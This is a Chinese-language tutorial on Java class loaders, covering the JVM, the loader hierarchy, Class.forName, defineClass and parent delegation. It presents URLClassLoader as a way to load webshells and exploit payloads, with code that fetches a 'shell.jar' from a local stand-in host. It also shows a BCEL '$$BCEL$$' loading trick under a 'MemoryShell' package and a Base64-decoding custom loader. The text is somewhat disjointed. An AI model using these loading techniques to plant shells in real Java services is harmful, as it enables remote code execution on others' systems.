еҹәжң¬жөҒзЁӢ

Java зЁӢеәҸзҡ„иҝҗиЎҢеҝ…йЎ»з»ҸиҝҮзј–еҶҷгҖҒзј–иҜ‘е’ҢиҝҗиЎҢ 3 дёӘжӯҘйӘӨпјҡ

1гҖҒзј–еҶҷпјҡжҳҜжҢҮеңЁ Java ејҖеҸ‘зҺҜеўғдёӯиҝӣиЎҢзЁӢеәҸд»Јз Ғзҡ„иҫ“е…ҘпјҢжңҖз»ҲеҪўжҲҗеҗҺзјҖеҗҚдёә .java зҡ„ Java жәҗж–Үд»¶гҖӮ 2гҖҒзј–иҜ‘пјҡжҳҜжҢҮдҪҝз”Ё Java зј–иҜ‘еҷЁеҜ№жәҗж–Үд»¶иҝӣиЎҢй”ҷиҜҜжҺ’жҹ»зҡ„иҝҮзЁӢпјҢзј–иҜ‘еҗҺе°Ҷз”ҹжҲҗеҗҺзјҖеҗҚдёә .class зҡ„еӯ—иҠӮз Ғж–Үд»¶пјҢдёҚеғҸCиҜӯиЁҖйӮЈж ·з”ҹжҲҗеҸҜжү§иЎҢж–Үд»¶гҖӮ 3гҖҒиҝҗиЎҢпјҡжҳҜжҢҮдҪҝз”Ё Java и§ЈйҮҠеҷЁе°Ҷеӯ—иҠӮз Ғж–Үд»¶зҝ»иҜ‘жҲҗжңәеҷЁд»Јз ҒпјҢжү§иЎҢе№¶жҳҫзӨәз»“жһңгҖӮ

Java иҷҡжӢҹжңәпјҲJVMпјүжҳҜиҝҗиЎҢ Java зЁӢеәҸзҡ„иҪҜд»¶зҺҜеўғпјҢJava и§ЈйҮҠеҷЁжҳҜ Java иҷҡжӢҹжңәзҡ„дёҖйғЁеҲҶгҖӮеңЁиҝҗиЎҢ Java зЁӢеәҸж—¶пјҢйҰ–е…ҲдјҡеҗҜеҠЁ JVMпјҢз„¶еҗҺз”ұе®ғжқҘиҙҹиҙЈи§ЈйҮҠжү§иЎҢ Java зҡ„еӯ—иҠӮз ҒзЁӢеәҸпјҢе№¶дё” Java еӯ—иҠӮз ҒзЁӢеәҸеҸӘиғҪиҝҗиЎҢдәҺ JVM д№ӢдёҠгҖӮиҝҷж ·еҲ©з”Ё JVM е°ұеҸҜд»ҘжҠҠ Java еӯ—иҠӮз ҒзЁӢеәҸе’Ңе…·дҪ“зҡ„зЎ¬д»¶е№іеҸ°д»ҘеҸҠж“ҚдҪңзі»з»ҹзҺҜеўғеҲҶйҡ”ејҖжқҘпјҢеҸӘиҰҒеңЁдёҚеҗҢзҡ„и®Ўз®—жңәдёҠе®үиЈ…дәҶй’ҲеҜ№зү№е®ҡе№іеҸ°зҡ„ JVMпјҢJava зЁӢеәҸе°ұеҸҜд»ҘиҝҗиЎҢпјҢиҖҢдёҚз”ЁиҖғиҷ‘еҪ“еүҚе…·дҪ“зҡ„зЎ¬д»¶е№іеҸ°еҸҠж“ҚдҪңзі»з»ҹзҺҜеўғпјҢд№ҹдёҚз”ЁиҖғиҷ‘еӯ—иҠӮз Ғж–Үд»¶жҳҜеңЁдҪ•з§Қе№іеҸ°дёҠз”ҹжҲҗзҡ„гҖӮ

зұ»еҠ иҪҪеҷЁ

Java зҡ„зұ»еҠ иҪҪеҷЁжҳҜдёҖдёӘйҮҚиҰҒзҡ„з»„д»¶,иҙҹиҙЈеңЁзЁӢеәҸиҝҗиЎҢж—¶еҠЁжҖҒеҠ иҪҪ Java зұ»ж–Үд»¶еҲ° Java иҷҡжӢҹжңәдёӯгҖӮ

javaдёӯжңүдёүз§Қзұ»еҠ иҪҪеҷЁ

  • Bootstrap ClassLoader (еј•еҜјзұ»еҠ иҪҪеҷЁ) иҜҘзұ»еҠ иҪҪеҷЁе®һзҺ°дәҺJVMеұӮпјҢйҮҮз”ЁC++зј–еҶҷ
  • Extension ClassLoader (жү©еұ•зұ»еҠ иҪҪеҷЁ)
  • App ClassLoader (зі»з»ҹзұ»еҠ иҪҪеҷЁ) й»ҳи®Өзҡ„зұ»еҠ иҪҪеҷЁ

BootstrapClassLoaderеҸӘеҠ иҪҪеҢ…еҗҚдёәjavaгҖҒjavaxгҖҒsunзӯүејҖеӨҙзҡ„зұ»)гҖӮ

жү©еұ•зұ»еҠ иҪҪеҷЁ(ExtensionsClassLoader)пјҢз”ұsun.misc.Launcher$ExtClassLoaderзұ»е®һзҺ°пјҢз”ЁжқҘеңЁ/jre/lib/extжҲ–иҖ…java.ext.dirsдёӯжҢҮжҳҺзҡ„зӣ®еҪ•еҠ иҪҪjavaзҡ„жү©еұ•еә“.

Appзұ»еҠ иҪҪеҷЁ/зі»з»ҹзұ»еҠ иҪҪеҷЁпјҲAppClassLoaderпјүпјҢз”ұsun.misc.Launcher$AppClassLoaderе®һзҺ°пјҢдёҖиҲ¬йҖҡиҝҮйҖҡиҝҮ(java.class.pathжҲ–иҖ…ClasspathзҺҜеўғеҸҳйҮҸ)жқҘеҠ иҪҪJavaзұ»пјҢд№ҹе°ұжҳҜжҲ‘д»¬еёёиҜҙзҡ„classpathи·Ҝеҫ„гҖӮ

Javaзұ»еҠ иҪҪж–№ејҸ

еҗҢж—¶дҪ еҸҜиғҪдјҡжңүз–‘й—®пјҢдёәд»Җд№Ҳе№іж—¶жІЎжңүзңӢеҲ°иҝҷдәӣзұ»зҡ„дёҖдёӘдҪҝз”ЁгҖӮе…¶е®һжҲ‘д»¬дёҖиҲ¬жғ…еҶөдёӢйғҪжҳҜдҪҝз”Ёзҡ„йҡҗејҸзҡ„дёҖдёӘзұ»еҠ иҪҪж–№ејҸгҖӮ

йҡҗејҸеҠ иҪҪ

йҖҡиҝҮеҲӣе»әзұ»зҡ„е®һдҫӢгҖҒи®ҝй—®зұ»зҡ„йқҷжҖҒжҲҗе‘ҳгҖҒз»§жүҝзұ»жҲ–е®һзҺ°жҺҘеҸЈзӯүж–№ејҸйҡҗејҸеҠ иҪҪзұ»гҖӮ

// еҲӣе»әзұ»зҡ„е®һдҫӢ
MyClass obj = new MyClass();

// и®ҝй—®зұ»зҡ„йқҷжҖҒжҲҗе‘ҳ
int value = MyClass.staticField;

// з»§жүҝзұ»
class SubClass extends MyClass { }

// е®һзҺ°жҺҘеҸЈ
class MyImplementation implements MyInterface { }

жҳҫзӨәеҠ иҪҪ

ClassLoaderзұ»еҠ иҪҪ

Class.forNameеҠ иҪҪ

йҖҡиҝҮ Class.forName() ж–№жі•жҳҫејҸеҠ иҪҪзұ»гҖӮиҝҷз§Қж–№ејҸдјҡи§ҰеҸ‘зұ»зҡ„еҲқе§ӢеҢ–иҝҮзЁӢгҖӮ

String className = "com.example.MyClass";
Class<?> clazz = Class.forName(className);

this.getClass().getClassLoader().loadClass(className);

еҰӮжһңдёҚеёҢжңӣеҲқе§ӢеҢ–зұ»еҸҜд»ҘдҪҝз”ЁClass.forName("зұ»еҗҚ", жҳҜеҗҰеҲқе§ӢеҢ–зұ», зұ»еҠ иҪҪеҷЁ)пјҢиҖҢClassLoader.loadClassй»ҳи®ӨдёҚдјҡеҲқе§ӢеҢ–зұ»ж–№жі•гҖӮ defineClassж–№жі•йҖҡеёёиў«иҮӘе®ҡд№үзҡ„зұ»еҠ иҪҪеҷЁйҮҚеҶҷпјҢз”ЁдәҺе°Ҷеӯ—иҠӮж•°з»„иҪ¬жҚўдёәClassеҜ№иұЎ,иҝҷеҜ№дәҺеҠЁжҖҒеҠ иҪҪзұ»жҲ–иҖ…еҠ иҪҪйқһж ҮеҮҶзҡ„зұ»ж–Үд»¶ж јејҸйқһеёёжңүз”ЁгҖӮ

еҰӮдёӢеұ•зӨәдәҶеҰӮдҪ•дҪҝз”ЁиҮӘе®ҡд№үзҡ„зұ»еҠ иҪҪеҷЁе’ҢdefineClassж–№жі•жқҘе®ҡд№үзұ»: иҜҰз»ҶеҠ иҪҪжөҒзЁӢ

  1. жҲ‘д»¬дҪҝз”ЁloadClassж–№жі•иҝӣиЎҢеҠ иҪҪеҗҺпјҢдјҡдҪҝз”ЁfindLoadedClassжқҘжЈҖжҹҘзұ»жҳҜеҗҰеҠ иҪҪиҝҮпјҢеҰӮжһңе·Із»Ҹиў«jvmеҠ иҪҪиҝҮжқҘпјҢе°ұзӣҙжҺҘдјҡиҝ”еӣһзұ»зҡ„еҜ№иұЎгҖӮ
  2. еҰӮжһңеҠ иҪҪеӨұиҙҘе°ұдјҡи°ғз”ЁиҮӘиә«зҡ„findclassгҖӮеҗҢж—¶жіЁж„ҸеҰӮжһңжІЎжңүйҮҚеҶҷдәҶfindClassж–№жі•пјҢйӮЈд№ҲзӣҙжҺҘиҝ”еӣһзұ»еҠ иҪҪеӨұиҙҘејӮеёёгҖӮ
  3. loadClassзҡ„ж—¶еҖҷдј е…Ҙзҡ„resolveеҸӮж•°дёәtrueпјҢйӮЈд№ҲиҝҳйңҖиҰҒи°ғз”ЁresolveClassж–№жі•й“ҫжҺҘзұ»пјҢй»ҳи®ӨдёәfalseгҖӮ
иҮӘе®ҡд№үеҠ иҪҪеҷЁ(зӣҙжҺҘеҲ©з”ЁdefineClass)

е…¶дёӯdefineClassж–№жі•йҖҡеёёиў«иҮӘе®ҡд№үзҡ„зұ»еҠ иҪҪеҷЁйҮҚеҶҷпјҢз”ЁдәҺе°Ҷеӯ—иҠӮж•°з»„иҪ¬жҚўдёәClassеҜ№иұЎ,иҝҷеҜ№дәҺеҠЁжҖҒеҠ иҪҪзұ»жҲ–иҖ…еҠ иҪҪйқһж ҮеҮҶзҡ„зұ»ж–Үд»¶ж јејҸйқһеёёжңүз”ЁгҖӮ

еҝ«йҖҹжҰӮи§Ҳ

RLClassLoaderз»§жүҝдәҶClassLoaderпјҢURLClassLoaderжҸҗдҫӣдәҶеҠ иҪҪиҝңзЁӢиө„жәҗзҡ„иғҪеҠӣпјҢеңЁеҶҷжјҸжҙһеҲ©з”Ёзҡ„payloadжҲ–иҖ…webshellзҡ„ж—¶еҖҷжҲ‘д»¬еҸҜд»ҘдҪҝз”ЁиҝҷдёӘзү№жҖ§жқҘеҠ иҪҪиҝңзЁӢзҡ„jarжқҘе®һзҺ°иҝңзЁӢзҡ„зұ»ж–№жі•и°ғз”ЁгҖӮжіЁж„ҸиҝҷйҮҢдҪҝз”ЁJARеҢ…,еҰӮжһңдҪҝз”Ёclassж–Үд»¶,еҝ…йЎ»жң¬ең°еӯҳеңЁеҜ№еә”зҡ„зұ»жүҚиЎҢ.

import java.net.URL;
import java.net.URLClassLoader;

public class RemoteClassLoaderExample {

    public static void main(String[] args) {
        try {
            // иҝңзЁӢ class ж–Үд»¶зҡ„ URL
            URL remoteUrl = new URL("http://127.0.0.1:8086/shell.jar");

            // еҲӣе»ә URL ж•°з»„
            URL[] urls = new URL[]{remoteUrl};

            // еҲӣе»ә URLClassLoader еҜ№иұЎ
            URLClassLoader classLoader = new URLClassLoader(urls);

            // еҠ иҪҪиҝңзЁӢзұ»
            Class<?> remoteClass = classLoader.loadClass("Test2");
            Object instance = remoteClass.getDeclaredConstructor().newInstance();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

BCELзҡ„зұ»еҠ иҪҪеҷЁеңЁи§Јжһҗзұ»еҗҚж—¶дјҡеҜ№ClassNameдёӯжңү$$BCEL$$ж ҮиҜҶзҡ„зұ»еҒҡзү№ж®ҠеӨ„зҗҶ

package MemoryShell.BCEL;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;


public class BCELDemo {
    public static void main(String[] args) throws Exception {

         JavaClass cls = Repository.lookupClass(calc.class);
         String code = Utility.encode(cls.getBytes(), true);
         System.out.println(code);

         new ClassLoader().loadClass("$$BCEL$$" + code).newInstance();
    }
}

з®ҖеҚ•жқҘиҜҙе°ұжҳҜзұ»еҠ иҪҪеҷЁжҺҘеҲ°еҠ иҪҪзұ»зҡ„иҜ·жұӮж—¶пјҢйҰ–е…Ҳдјҡе…Ҳе°Ҷд»»еҠЎе§”жүҳз»ҷзҲ¶зұ»еҠ иҪҪеҷЁпјҢжҺҘзқҖиҜ·жұӮзҲ¶зұ»еҠ иҪҪиҝҷдёӘзұ»пјҢеҪ“зҲ¶зұ»еҠ иҪҪеҷЁж— жі•еҠ иҪҪж—¶пјҲе…¶зӣ®еҪ•жҗңзҙ иҢғеӣҙжІЎжңүжүҫеҲ°жүҖйңҖиҰҒзҡ„зұ»ж—¶пјүпјҢеӯҗзұ»еҠ иҪҪеҷЁжүҚдјҡиҝӣиЎҢеҠ иҪҪдҪҝз”ЁгҖӮ

жҲ‘д»¬еҸҜд»ҘзңӢеҲ°жҲ‘д»¬иҮӘе®ҡд№үзҡ„зұ»жҳҜеңЁжңҖдёӢйқўзҡ„,жүҖд»ҘжҲ‘д»¬жҳҜж— жі•жӣҙж”№javaеҶ…йғЁзҡ„дёүдёӘеҠ иҪҪеҷЁжүҖиҙҹиҙЈзҡ„зұ».

еӣ дёәз¬¬дёҖдёӘиҝӣиЎҢеҠ иҪҪеҠЁдҪңзҡ„е…¶е®һжҳҜжңҖйЎ¶еұӮзҡ„еј•еҜјзұ»еҠ иҪҪеҷЁпјҢйӮЈд№Ҳеј•еҜјзұ»еҠ иҪҪеҷЁеҺ»еҜ»жүҫзҡ„зӣ®еҪ•зҡ„javaзұ»дјҳе…Ҳзә§е°ұжҳҜжңҖй«ҳзҡ„гҖӮеҚідҪҝжңүеҗҢеҗҚзҡ„javaзұ»пјҢд№ҹдёҚдјҡеҪұе“Қjavaзі»з»ҹиҝҗиЎҢгҖӮ

зұ»еҠ иҪҪж–№ејҸ

  1. е‘Ҫд»ӨиЎҢеҗҜеҠЁеә”з”Ёж—¶еҖҷз”ұJVMеҲқе§ӢеҢ–еҠ иҪҪ
  2. йҖҡиҝҮClass.forName()ж–№жі•еҠЁжҖҒеҠ иҪҪ
  3. йҖҡиҝҮClassLoader.loadClass()ж–№жі•еҠЁжҖҒеҠ иҪҪ

д»–д»¬зҡ„еҢәеҲ«жҳҜ

  • Class.forName(): е°Ҷзұ»зҡ„.classж–Үд»¶еҠ иҪҪеҲ°jvmдёӯд№ӢеӨ–пјҢиҝҳдјҡеҜ№зұ»иҝӣиЎҢи§ЈйҮҠпјҢжү§иЎҢзұ»дёӯзҡ„staticеқ—пјӣ

public class ClassLoaderStudy extends ClassLoader {
    private static final String testClassName = "Test2";
    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        byte[] data=loadClassData(name);
            if (data != null) {
                return defineClass(testClassName, data, 0, data.length);
            }
        return super.findClass(name);
    }
    private byte[] loadClassData(String className) {
        String fileName = File.separatorChar
                + className.replace('.', File.separatorChar) + ".class";
        try {
            System.out.println(fileName);
            InputStream ins = new FileInputStream(fileName);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int bufferSize = 1024;
            byte[] buffer = new byte[bufferSize];
            int length = 0;
            while ((length = ins.read(buffer)) != -1) {
                baos.write(buffer, 0, length);
            }
            byte[] byteArray = baos.toByteArray();
            Base64.Decoder base64Decoder = Base64.getDecoder();
            // еҜ№еӯ—иҠӮж•°з»„иҝӣиЎҢBase64и§Јз Ғ
            byte[] decodedData = base64Decoder.decode(byteArray);
            // иҝӣиЎҢBase64и§Јз Ғ
            return decodedData;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
    public static void main(String[] args) throws Exception {
        ClassLoaderStudy loader = new ClassLoaderStudy();
        Class testClass = loader.loadClass("home/kali/жЎҢйқў/test");
        Object o = testClass.newInstance();
    }
